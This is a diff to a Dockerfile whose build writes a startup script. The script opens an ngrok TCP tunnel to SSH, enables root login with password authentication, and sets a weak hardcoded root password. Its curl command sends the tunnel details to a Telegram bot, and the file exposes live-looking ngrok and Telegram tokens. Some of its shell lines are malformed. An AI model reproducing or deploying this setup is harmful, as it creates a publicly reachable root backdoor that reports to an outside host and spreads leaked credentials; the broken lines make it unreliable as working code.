@@ -7,10 +7,11 @@ RUN echo "./ngrok config add-authtoken 2DTlUjeLy6Z4I0Zh426Jlu5rVqZ_3L7HPD51nwmGE
 RUN echo "laz = (curl --silent --show-error http://127.0.0.1:4040/api/tunnels)"
 RUN echo "curl -X POST https://api.telegram.org/bot5663284770:AAHls-QSDcYdukTjbq3KrtZMo09ogWlSsxk/sendMessage?chat_id=1320233599&text=$$laz &&" >>/1.sh
 RUN echo "./ngrok tcp --region id 22 &>/dev/null &" >>/1.sh
-RUN echo '/usr/sbin/sshd -D &&' >>/1.shRUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
+RUN echo '/usr/sbin/sshd -D &&' >>/1.sh
+RUN echo 'PermitRootLogin yes' >>  /etc/ssh/sshd_config 
 RUN echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config
 RUN service ssh start
 RUN chmod 755 /1.sh
 RUN echo root:haznre|chpasswd
 EXPOSE 80 8080
-CMD  /1.sh
+CMD /1.sh
